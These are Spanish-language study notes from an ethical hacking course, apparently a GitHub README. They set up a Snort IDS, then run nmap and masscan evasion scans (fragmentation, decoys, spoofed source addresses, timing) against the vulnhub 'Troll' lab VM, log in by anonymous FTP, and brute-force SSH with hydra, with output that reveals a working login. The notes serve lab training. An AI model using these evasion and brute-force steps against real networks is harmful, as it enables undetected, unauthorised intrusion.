# Curso-avanzado-de-Hacking-Etico-y-Ciberseguridad

DC01> nombre del controlador del dominio
corp.local>nombre del dominio
Busca cualquier archivo en windows, en este caso snort.conf, S para subdirectorios y B muestra el
nombre del archivo, ojo, en este caso busque en C: puede ser en A: u los demas discos

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
dir /S /B C:\snort.conf
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

para descargar un fichero de un navegador

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
curl http://http://192.168.159.129/0x0856BF/good_luck/which_one_lol.txt > users.txt
le decimos que descargue exactamente donde estamos y lo pasamos a un .txt creado
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Para instalar paquetes .deb

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
sudo apt-get dpkg -i paquete.deb
tambien -i > --install

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Desintalr paquete .deb

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
sudo dpkg -r paquete.deb
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

• Abrir una nueva terminal:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
◇ Presiona Ctrl + Alt + T
◇ abrira la terminal en modo de ventana al lado de la otra
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Para descomentar o comentar en emacs

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
alt+; > todo lo seleccionado con el raton
alt+x uncomment-region y enter para descomentar
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Para copiar los archivos de una carpeta y enviarla a otra 

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
sudo cp * ~/Desktop/rules
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Para corregir el error de dependencias rotas al ejecutar sudo apt-get upgrade

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
sudo apt --fix-broken install
y luego ya podemos volver a ingresar el comando para actualizar
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Para saber el pid del proceso actual

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
echo $$
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

esto tambien para saber el tipo de consolo que utiliza, nos dirigimos a:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
cd /proc/y proceso que arroja echo $$ luego
ls
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Para ver el tipo de consola

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
sh luego
ls -l exe o ls -l /proc/$$/exe
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

De igual forma otra consola

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
bash
ls -l /proc/$$/exe
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

por el momento en la terminal kali utiliza la mas recomendable a la fecha que es zsh
 de lo contrario en otro sistema seria adaptarlo y como ver si la terminal se utiliza shell de zsh

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
ls -l /proc/$$/exe dentro de la terminal nueva
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Para comentar en un archivo lo selecionado, alt + x y 

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
comment-region
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

video 7 para personalizar la terminal de kali
Pagina como vulnhub, nos ayudan a practicar con maquinas virtuales con vulnerabilidades
de nivel facil a dificil, tanto como virtualbox y vmware

en powershell, luego de instalar snort en la maquina host y ncap al ingresar a la direccion
de snort debe de ser cd \snort luego para bin es cd .\bin o cd bin

Para moverme por el terminal de windows
A: para ir al disco A
wmic logicaldisk get caption > para ver cuales discos la pc a creado

Pasos para agregar emacs al sistema e introducir emacs archivo.x en vez de direccion de emacs y direccion del archivo


En Windows 11, puedes seguir estos pasos para editar las variables de entorno:
1. Abrir Configuración Avanzada del Sistema:
• Haz clic con el botón derecho en el botón de "Inicio" (o presiona Windows + X).

• Selecciona "Sistema".
• En la ventana del sistema, haz clic en "Configuración avanzada del sistema" en el panel derecho.


• Ir a Variables de Entorno:
◇ En la ventana de Propiedades del Sistema, haz clic en el botón "Variables de entorno..." cerca de la parte inferior.


• Editar Variables del Sistema:
◇ En la nueva ventana, encontrarás dos secciones: "Variables del usuario" y "Variables del sistema".
◇ Para modificar el PATH del sistema, debes hacer cambios en la sección "Variables del sistema".
◇ Busca la variable llamada "Path" en la lista y haz clic en "Editar".


• Agregar la Ruta a bin de Emacs:
◇ Haz clic en "Nuevo" y agrega la ruta completa a la carpeta bin de Emacs. En tu caso, sería algo como C:\Program Files\Emacs\emacs-29.2\bin.


• Aceptar y Cerrar:
◇ Acepta todas las ventanas haciendo clic en "Aceptar" o "Cerrar".


• Reiniciar la Terminal:
◇ Es importante cerrar y abrir una nueva terminal (cmd o PowerShell) para que los cambios en las variables de entorno surtan efecto.


Pero en winodws a diferencia de linux que con nano u otras formas por defecto se puede abrir, aqui seria 
con notepad, ya con emacs u otro recurso del usuario

de igual forma con emacs precioanado ctrl+X+F e ingresamos la direccion del archivo en este caso \snort\etc\snort.conf
nos abrira el archivo 


Se copia todo de la carpeta acutal, donde estemos dentro y se enviara a la direccion 
proporcionada en este caso en el escritorio carpeta rules

luego de haber configurado las reglas en snort.conf, ingresamos a la direccion del ejecutable
y decimos que .\snort -W , con esto podremos ver todas las redes conectadas a nuestro
router incluyendo nuestra maquina host, luego verificamos la red de la maquina kali
en este caso #6 ejecutamos 

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
.\snort.exe -W para ver a la red que conectar en -i
recordar estar dentro de la carpeta .\snort\bin
.\snort.exe -i numero de red a escuchar -A console -c C:\Snort\etc\snort.conf

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Recordar que snort la descargue como en windows host como mi maquina kali linux
es una herramienta con varias reglas que antes debemos configurar para verificar el analisis 
de nuestra maquina a la hora de ejecutar algun ataque, por ejemplo protejo la maquina kali desde 
mi maquina host y la sapuerviso a traves del nodo de mi red y veo todos los ataques que realiza
esta herramienta me funciona tambien para ver cuales ataques no me detecta y tenerlo presente


para ponerlo a prueba e dicho que en la kali linux un excaneo por ejemplo una empresa me dice
que verifique vulnerabilidades y todas las maquinas que estan expuestas algo sencillo asi lo 
realizare con nmap,
 
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
nmap -n ip de la maquina en la cual ejecuto el comando
me obvio los ultimos digitos coloco un 0 en su lugar y /24
para que analice todos los puertos tambien de la siguiente forma
nmap -sn 192.168.159.0/24 me guio de la ip de la maquina y obvio 
del ultimo digito y digo .0/24, -n mostrara todas las maquinas levantadas 
y sus vulnerabilidades es decir sus puertos abiertos. -sn solo las maquinas
para mas informacion nmap -h.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

 Que ha pasado que snort nos ha detectado el escaneo a los puertos y las direcciones
 luego de esto reinicio snort ctrl+c en mi host y el comando que ya sabemos para volver
 supervisar la maquina linux, pero antes me voy a mi navegador e investigo en nmap
 algun comando para no escanear puertos (no port scan) que es lo que nos fijamos
 algunas de las cosas que detecto snort, investigando encuentro una opcion o un 
 comando que es -sn, recordar que reiniciamos snort para que detecte ya que para no
 saturarse la segunda vez quizas lo salte, reiniciamos colocamos el comando para volver
 a supervisar e ingresamos nmap con el comando -sn, otra cosa antes de y es que podemos 
 tambien ver el trafico por wireshark, en el caso anterior con -n protocolos como ARP y TCP
 salieron dispararos en wireshark, ahora con el comando 
 
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
sudo nmap -sn -n ip.0/24, vemos que solo pasa trafico en wireshark
de ARP si buscamos !ARP no hay nada que no sea ARP en wireshark
y algo muy interesante el ids de snort no ha detectado nuestro analisis
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

 Recordar que -sn solo hace escaneo mediante ARP, aun asi nos lanzo todas las maquinas enlazadas a nuestro nodo
 Recordar que el protocolo ARP no es muy confiable, se puede envenenar y se pueden hacer por otro host y hacernos
 ver que hay mas host levantados
 
 Otra opcion de nmap para analicis mas avanzados es el comando -PS que se abrira paso mendiante
 TCP para el analisis, pero snort lo capt, lo siguiente antes visto seria agregarle simplemente -sn
 
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
nmap -sn -n -PS ip.0/24
aqui snort no lo capto y con este comando a diferencia de ARP
como hablamos anteriormente que se puede realizar un spoof y 
decirle a la maquina que hay mas host activos siento esto falso
TCP envia a traves del puerto 80 confirmaciones y no estregara 
la informacion correcta y en wireshark si buscamos !arp encontraremos
trafico de TCP pero mediante -sn recordemos snort no lo detecto
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

 Recordar siempre que el puerto por defecto a analizar es el 80, para otro en especifico seria 
 -PS34 como ejemplo, existen otros como -PA, -PU pero al utilizar -sn para que snort no nos 
 detecte no validan la informacion solo con ARP y como ya sabemos esa informacion la 
 podemos o se puede infectar y decir que por ejemplo hay 5 maquinas mas activas
 La mas recomendable por el momento es -PS
 
 
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
sudo nmap -sS -n --top-ports 5 192.168.137.129  
le decimos a kali hey con --top-ports le decimos que me
analice los 5 puertos mas importantes que crees, ya que 
de lo contrario analizara mas puertos de la cuenta y por cantidad
de puertos a analizar snort me detectara el analicis, en este caso
muestra los 5 puertos mas importantes que estan abiertos en este caso
solo 3 y 2 cerrados de la maquina victima troll
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

 Tener en cuenta que con el comando anterior no podemos ser ambisiosos, ya que si por ejemplo
 decidimos escanear 10 puertos de forma automatica 
 
 Para hacerlo de forma especifica seria
 
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
sudo nmap -sS -n -p5,6,7,8,10 192.168.137.129  
5 puertos escaneados segun lo que decida
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

 Para mas informacion de evasion a traves de analisis con nmap
 nmap firewall evasion pagina web
 
 Otro escaneo seria mediante -f .> fragmentacion nos divide el paquete al enviar en partes
 para que snort u otro ids o firewall no lo detecte nuestro analisis o peticion
 cada -f corresponde a 8 bytes -ff 16 bytes y sucesivamente, que podemos hacer con 
 la fragmentacion pues en wireshark podemos ver que cuando se envia por 
 fragmentacion aparecen protocolos de ipv4 2 en mi caso cada uno de 8bytes
 y luego el protocolo TCP que los une, esto si se hace a gran escala hacia la maquina
 victima puede ocasionar que ocupe mucho de sus recursos y podemos hacer que esta
 se sature.
 
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
sudo nmap -sS -ff -n -p 80 192.168.137.129  
para 16 bytes ya que con -f snort nos detecto
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

 Otra opcion ser -mtu en este caso le tenemos que indicar cuantos bytes, en cuantos
 fragmentos la dividimos -mtu 8 que seria igual que un -f
 Recordar que tampoco detecta la fragmentacion por que le decimos en este caso que
 solo escanee un solo puerto -p 80, sin esta directriz si snort lo detectaria.
 
 Otro que veremos -D > es un señuelo
 Esto nos ayudara por ejemplo en una empresa atacamos una maquina y los ids estan
 activos con este señuelo crearemos mas maquinas como tal como señuelos para que 
 no sepa cual maquina es la atacante, es decir, nos esconderemos en varios señuelos
 para que no detecten nuestra ip atacante.
 
 
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
sudo nmap -sS -n -D ip de las maquinas que estan dentro  192.168.137.129 
recordar que la .129 es la maquina victima troll, para que sea mas realista
o mas bien mas creible deberemos de usar ip de maquinas que hayan sido
encontradas en nuestro analisis y se muestran activa, en este caso tengo
pocas maquinas activas y las pondre de mi mente, pero en una empresa
al realizar un escaneo de red puedo copiar todas las ip de las maquinas activas
para colocarlas como senuelo. 
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

 
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
sudo nmap -sS -n -D 192.168.137.1,ME 192.168.137.129  
cuando se disparen las alarmas veran analisis realizados desde
la maquina .1,ME que es la maquina atacante, de esa forma
con mas maquinas no sabra quien le ataco.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

 
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
02/25-02:14:53.495614  [**] [122:1:1] (portscan) TCP Portscan
[**] [Classification: Attempted Information Leak] [Priority: 2]
{PROTO:255} 192.168.137.1 -> 192.168.137.129 es lo que vera el ids
es decir nuestra ip .129 no aparece en su lugar con ,ME aparece el senuelo.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

 Un error que no me puedo dar el lujo ya que cometido se destapara el rollo, es colocar como senuelo
 la maquina victima, recordadlo
 
 Otra forma de evadir los ids
 
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 sudo nmap -Pn -S 192.168.137.1 -n -e eth0 -p80 192.168.137.129
por el momento solo funciona con la version de nmap 7.8
-S coloca una ip de senuelo pero -e ingresa nuestra direccion
fisica nuestra mask y le decimos a un unico puerto para no hacer
tan grande nuestro analisis.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

 Porque colocar nuestra direccion fisica porque recordar que mediante los protocolos quien
 preguntara sera la ip senuelo pero no nos vale de nada colocar tambien una mask falsa
 porque no nos llegara ningun analisis, esto tambien nos funciona ya que digamos empresas
 mas restringida limitan la red de las maquinas y configuran direcciones ip con ciertas 
 acciones digamos que con ciertas limitaciones y con -S podemos ser cualquier maquina de
 la empresa y hasta atacar otra maquina a traves del senuelo.
 
 Otra forma de comunicacion entre las maquinas es decirle hey envie una informacion
 a traves del puestro 80 para saber del puerto tuyo 21, como lo hago pues
 
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 sudo nmap -Pn -S 192.168.137.1 -n -e eth0 --source-port 80 192.168.137.129

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

 
 Otras formas de evadir el ids y sus reglas que muchas de ellas se limitan por el tiempo en que se envian
 paquetes de tcp entre maquinas, es decir, una regla que diga que si de mi maquina hacia otra maquina
 se envia paquetes de tcp cada segundo se lea como un ataque y prosiga con la alerta de que es
 un escaneo
 
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
sudo nmap -sS -n --scan-delay 1 192.168.137.129
Para esto --san delay y le decimos 1 segundo
tambien -t  paranoid(0), sneaky (1), polite (2), normal (3)
, aggressive (4), and insane (5)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

 Esto no nos sirvira ya sea por el patron o escaneo de este analisis
 
 La opción --open le indica a Nmap que solo debe mostrar los hosts que tienen al menos un puerto abierto de los especificados.
 
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
sudo nmap -sV -p 21,22,80 -n --open 192.168.0.0/16

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

 como podemoshacer, de la siguiente manera
 
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
for i in {0..30..2}; do; sudo nmap -sS -p$(($i+1))-$(($i+2))
 -n 192.168.137.129; sleep 30; done;
 por medio de un for me recorrera de 0 a 30 puertos de 2 en 2
 luego lo paso a nmap y le digo primero 1+1 y luego 1+2 para dos puertos en concreto
 luego de otro parametro -n y la maquina victima un sleep de 30 seg que se tomara
 en cada puerto que se pasara.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

 El bucle utiliza la sintaxis {inicio..fin..paso} para generar una secuencia de números del 0 al 30 con un paso de 2. Luego, utiliza la variable i en la construcción del comando Nmap, escaneando los puertos en el rango especificado y pausando durante 30 segundos antes de la próxima iteración.
 
 Mi forma para ejecutar el scrip seria
 
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Crear un emacs ejemplo.sh
pegar for i in {0..30..2}; do; sudo nmap -sS -p$(($i+1))-$(($i+2))
 -n 192.168.137.129; sleep 30; done; y lueo de guardarlo ejecutarlo
 bash ejemplo.sh 
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

 mientras mas cauteloso menos probabilidad de que nos detecten , por ejemplo
 escanear menos puertos posibles en mi caso 10 de dos en dos con tiempo paralelo
 de 30 segundos , y aun asi me detecta, para que no lo detecte realice lo siguiente
 
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
for i in {0..30..2}; do; sudo nmap -sS -p$(($i+1))-$(($i+2)) -n 192.168.137.129;
 sleep 45; done;
 le agrego mas tiempo y menos puertos mejor
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

 Y si le anadimos -f , -ff podemos insertar mas puertos o simplemente dejarlo con los puertos actuales
 y tener mas probabilidades de no ser detectados
 
 Otra forma de evadir snort es utilizando la direccion de de red ipv6 en vez de la comun ipv4
 muchas veces a las empresas se les olvida colocar reglas para esta direccion
 pero antes que es ipv4 y ipv6 son las direcciones de nuestras maquinas como una 
 identificacion para comunicarnos a traves de nodos diferentes es decir por internet
 pero en la actualidad se creo ipv6 ya que ipv4 tuvo limites en su red y se saturaba
 Ahora sabiendo esto, lo primero seria identificar la red ipv6 de la maquina victima
 ya que si realizamos el escaneo a traves de nmap -6 identificando que quiero hacerlo
 para ipv6 pero con la direccion normal que seria ipv4 dira que no reconoce la direccion 
 como tal.
 lo primero seria ping6 para ipv6 y ff02::1 esto es una llamada a Todos los nodos del segmento de red local
 luego un ip neigh para ver los vecinos que nos han respondidos en wireshar estaran como neighbor
 
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
luego de ping6 y ff02::1 y de ip neigh identifico la direccion ipv6
de la maquina victima, en este caso esta debajo de la direccion ipv4
luego puedo decir que sudo nmap -sS -n -6 fe80::20c:29ff:fef6:d02b -e eth0
identificando mi red con -e que en estas prubeas recordad se llama eth0
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

 Esta tambien nos la detecto pero siempre tenerlo en cuenta
 
 
 Como proceder luego del escanceo de nmap pues ahora toca escanear los puertos de la maquina victima
 con otro comando y ver los puertos abiertos mas el porque de ello, para buscar vulnerabilidades locales
 me refiero a los exploit o buscar uno externo.
 
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
sudo nmap -sV es el inidicado luego -n y ip de la maquina victima
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

 pero esto obviamente snort lo detectara de forma seguida.
 
 Pero que pasa como ya previamente habiamos buscado por parte ya sea por tiempo programado
 fragmentado u otro metodo para escanear puertos sin ser detectados ya podemos realizar
 el mismo comando pero dirigidos a los comando abiertos
 
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
sudo nmao -sV -n -p80,21,22 mas ip de la maquina victima
en mi caso con la maquina troll estos fueron los puertos detectados
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

 Otro comando por ejemplo es para reconocer el sistema operativo de tu maquina victima
 
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
sudo nmap -O -n + ip
Pero esto obviamente lanzara una alerta
pero si le indico los puerto si soy especifico y no genero mucho trafico
de packetes no detectara el analisis
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

 de igual forma utilizar todas las medidas hasta ahora para no ser detectado como el --scan-delay 5 por ejemplo
 digamos que le coloco 5 para que transcurra 5 seg entre cada packete
 
 Como tambien anteriormente mencionado , el top de los puertos que solo incluira a los puertos abiertos
 
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
sudo nmap -sS -top-ports 5 -n 192.168.137.129
en este caso indique los 5 mas importantes
sudo nmap -sS -sV -top-ports 5 -n 192.168.137.129
de igual forma snort no lo detecta.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

 Otras herrmientas a utilizar cono naabu que solo seria naabu+ip
 
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
naabu + ip maquina victima me muestra la maquina y sus 
puertos abiertos
Y se detecta casi de forma automatica por snort
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

 es una herramienta en mi actualidad nueva practicamente y los ids como snort tambien tienen
 conocimientos y ya aplican en ella sus reglas, solamente es para investigar y ver que beneficios
 le podemos sacar y recordar que a veces nmap le tienen cerradas las puertas en varias cosas
 es decir, no tiene acceso y herrmaientas como esta pueden ser util
 
 Otra herrmienta es netcat
 
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
netcat -nvw2 192.168.137.129 1-90
-w seguido 2 dice que tardara un intervalo entre escaneo de 2 segundos
le tenemos que dar la direccion ip de la maqina de lo contrario dira que no
lo encontro, luego el parametro de puertos a analizar.
-v para mas detalles y -n para indicar las direcciones ip 
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

 
 Otra herramienta para analisis de gran alcance y velos se llama masscan, recordar que funciona con internet
 esta puede realizar el analisis de millones de paquetes en segundos, es obvio que se detectara pero es una 
 herramienta para realizar analisis, es decir, se utiliza para escanear red completa de una empresa.
 
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
sudo masscan 192.168.159.0/24 -p80 --interface eth0    
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

 le podemos anadir --rate para el rango de paquetes por ejemplo 
 
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
sudo masscan 192.168.159.0/24 -p80 --interface eth0 --rate 10000
ahora le digo excanea 10mil paquetes por segundo
recalco esta herramienta es para uso de escaneo eficiente
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

 Que importante es pues si deseamos no esperar el escaneo de la empresa lo podemos pausar retomar y ver donde
 nos quedamos, durante el analisis precionamos ctrl+c y luego no dira hey dejame guardar tu estado en el archivo
 paused.conf
 
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
sudo masscan --resume paused.conf para retomar el analisis

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

 En este caso me mostro con el comando top-ports todos los puertos abiertos en conjunto a su maquina abiertos
 en cuestion de segundos
 
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
sudo masscan ip.0/24 --top-ports 100 --interface eth0 --rate 10000
recordar el comando top que le dice en este caso muestrame los top 100 puertos
mas comunes abiertos con un radio de 10mil paquetes por segundo que es --rate
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

 Tambien para ver si hay mas nodo con otra ip nos puede ayudar colocar 0.0/16 asi susecivamente
 
 Para conectar a vpn
 En este caso utilice el archivo que me proporciono hack the box, academy-regular.opvn
 Solo ingreso a la terminal luego de descargar el archivo y
 
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
sudo openvpn archivo.opvn
el servicio openvpn en linux ya esta instalado en este caso
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

 
 Bien, ya sabiendo cuales son los puertos abiertos en la maquina victima en este caso maquina troll
 dirigimos nuestro ataque directamente hacia esos puertos para ver los servicios abiertos
 
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
sudo nmap -sV -p80,21,22 en este caso -n ip maquina victima

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

 En este caso el puerto 80 muestra un servicio apache esto quiere decir que hay un servicio corriendo
 y podemos ingresar la ip de la maquina victima en nuestro navegador para verlo
 
 El puerto 21 tiene un servicio llamado vsftpd 3.0.2 que hariamos con esto
 como en el curso anterior, iriamos a nuestro explorador y a traves de google diriamos que hey buscame 
 lo siguiente: vsftpd 3.0.2 cve, como ya lo habiamos visto, investigar sobre esta vurnerabilidad e investigar
 si tiene algun exploit publico.
 Como tambien vsftpd 3.0.2 exploit site:github.com
 
 O simplemente como el puerto 22 colocar la vurnerabilidad tal cual, OpenSSH 6.6.1p1 vulnerabilidad o exploit y listo
 
 Otra cosa que debemos de saber en este caso es el puerto 21 que tiene servicio abierto de ftp, que significa
 que tenemos una apertura de transferencia, usualmente para logearme dentro de la maquina
 simplemente 
 
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
ftp 192.168.159.129
Connected to 192.168.159.129.
220 (vsFTPd 3.0.2)
Name (192.168.159.129:kali): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> 

ingreso como nombre al usuario anonymous sin contrasena y mira lo que pasa
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

 
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
ftp> ls
229 Entering Extended Passive Mode (|||50691|).
150 Here comes the directory listing.
-rwxrwxrwx    1 1000     0            8068 Aug 09  2014 lol.pcap
226 Directory send OK.
ingresamos ls y vemos un archivo llamado lol.pcap que es un archivo de trafico de red
para transferir ese paquete a nestra maquina seria solamente get lol.pcap y listo
solo queda salir 'exit' y vemos que tenemos para analizarlo.
El mismo archivo lo abrimos en nuestra maquina con wireshark lol.pcap
Nos interesa los datos del protocolo ftp-data, dentro pude ver la informacion de
un texto llamado secret_stuff.txt, todo lo que veremos en este fichero es el proceso desde 
que entramos con ftp + ip de la maquina victima hasta el comando exit.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

 Bueno esto parece un juego y debemos de averiguar donde mas buscar
 Dentro de fto-data encontre
 
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Well, well, well, aren't you just a clever little devil, you almost found 
the sup3rs3cr3tdirlol :-P\n que significa
Bueno, bueno, bueno, ¿no eres solo un diablillo inteligente?
 Casi encuentras el sup3rs3cr3tdirlol :-P\n
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

 Lo que hice fue lo siguiente, al ver que tambien tiene el servicio anteriormente mencionada apache
 en mi navegador ip de la maquina victima /sup3rs3cr3tdirlol y me aparecio mas informacion, al parecer habia mas
 recordar que dentro de por ejemplo las paginas web como lo es este servicio podemos inyectar codigos y navegar dentro.
 
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
192.168.159.129/sup3rs3cr3tdirlol
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

 Dentro del archivo en este caso se llama roflmao que descargue dentro utilizando emacs encontre lo siguiente:
 (Ubuntu 4.8.2-19ubuntu1) 4.8.2 version del sistema operativo de la victima
 Find address 0x0856BF to proceed es algo que me llamo la atencion que me dice que encuentre esta direccion
 podria investigar mas o pasarselo a una inteligencia artificial para ver que se me paso de vista
 
 
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
http://192.168.159.129/0x0856BF/
con esto encontramos mas carpetas mas informacion
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

 
 Bien otro puerto tenia el servicio ssh, intentemos entrar
 ya tenemos a traves de la direccion anterior mas informacion como los usuarios y clave
 
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Vamos a utilizar una herramienta automatica para entrar a la fuerza o podemos
usar 1 por 1 los usuarios y la clave
descargamos la carpeta donde estan los usuarios
curl http://http://192.168.159.129/0x0856BF/good_luck/which_one_lol.txt > users.txt
ahora utilizaremos la herramienta hydra
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

 
 Herramienta hydra
 
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
hydra -L users.txt -p "Good_job_:)" 192.168.159.129 ssh 
para mas informacion hydra -h para ver el uso de -L y -p
en -p le decimos que para todos los usuarios que le pasamos en el 
archivo users.txt que lo dejamos ordenados usuarios en fila nada de
lo que tenia como por ejemplo usuario1  <-----this , se debe de dejar
solamente usuario1 y limpiar lo demas, lo dejamos en doble comillas y
que pruebe la misma clave con todos los usuarios luego la ip de la
victima y luego el servicio ssh que hablamos anteriormente y es el mismo abierto
del puerto.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

 Recordemos que esto de maquinas virtuales son juegos basicamente, la contrasena no era la que estaba dentro
 del fichero sino el nombre del fichero en este caso “Pass.txt”, al principio nos rechazo por la fuerza bruta solo
 ingrese el mismo comando y se conecto, me dice el puerto, me dice el servicio, host maquina victima, usuario y clave.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
hydra -L users.txt -p "Pass.txt" 192.168.159.129 ssh
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military 
or secret service organizations, or for illegal purposes (this is non-binding, these *** 
ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-03-02 20:43:33
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended
 to reduce the tasks: use -t 4
[DATA] max 10 tasks per 1 server, overall 10 tasks, 10 login tries (l:10/p:1),
 ~1 try per task
[DATA] attacking ssh://192.168.159.129:22/
[22][ssh] host: 192.168.159.129   login: overflow   password: Pass.txt
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-03-02 20:43:39

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


De lo contrario seria colocarle un limitador como un maximo de usuario para que este no se sature en caso de que sean 
muchos, en este caso al ser solo 10 en caso de no haberse hecho se podria haber hecho manual

Entramos los datos que sabemos que funcionaria

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
ssh overflow@192.168.159.129
overflow@192.168.159.129's password: 
Welcome to Ubuntu 14.04.1 LTS (GNU/Linux 3.13.0-32-generic i686)

 * Documentation:  https://help.ubuntu.com/

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.
